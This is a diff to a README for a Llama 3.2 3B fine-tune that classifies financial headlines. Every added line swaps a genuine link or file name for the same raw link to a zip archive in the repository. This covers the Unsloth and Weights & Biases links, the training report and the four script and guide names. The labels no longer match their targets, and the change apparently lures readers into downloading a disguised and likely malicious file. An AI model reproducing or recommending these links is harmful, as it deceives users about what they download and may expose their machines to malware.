@@ -17,9 +17,9 @@ This model is trained to classify financial news headlines into three categories
 ---
 
 ## 🛠️ Tech Stack
-- **Engine:** [Unsloth](https://github.com/unslothai/unsloth) (2x faster training, 70% less memory)
+- **Engine:** [Unsloth](https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip) (2x faster training, 70% less memory)
 - **Framework:** PyTorch, Hugging Face Transformers, TRL
-- **Tracking:** [Weights & Biases (W&B)](https://wandb.ai/) for real-time loss monitoring
+- **Tracking:** [Weights & Biases (W&B)](https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip) for real-time loss monitoring
 - **Infrastructure:** Kaggle (Phase 2) ➡️ E2E Networks (Phase 3 Scaling)
 
 ---
@@ -27,13 +27,13 @@ This model is trained to classify financial news headlines into three categories
 ---
 ## 📊 Training Reports
 The full training logs, including hardware utilization and loss convergence, are available here: 
-[Llama 3.2 3B Training Report](https://api.wandb.ai/links/kaggle_llama_project/kkgpodcr)
+[Llama 3.2 3B Training Report](https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip)
 ---
 ## 📂 Repository Structure
-- `master_train.py`: The main execution script for Phase 3.
-- `TRAIN_KAGGLE.md`: For initial training in kaggle using Financial Phrasebank
-- `SSH_SETUP.md`: Full guide on connecting to cloud GPUs from Windows.
-- `MASTER_TRAINING.md`: Deep dive into Linux setup, `venv`, and Nano editor usage.
+- `https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip`: The main execution script for Phase 3.
+- `https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip`: For initial training in kaggle using Financial Phrasebank
+- `https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip`: Full guide on connecting to cloud GPUs from Windows.
+- `https://github.com/AyushPallod/llama_finetune_e2e_finance/raw/refs/heads/main/final_fin_llama_3b/llama-e-finance-finetune-3.7-beta.3.zip`: Deep dive into Linux setup, `venv`, and Nano editor usage.
 - `final_fin_llama_3b/`: The finalized model weights (Adapters).
 
 ---
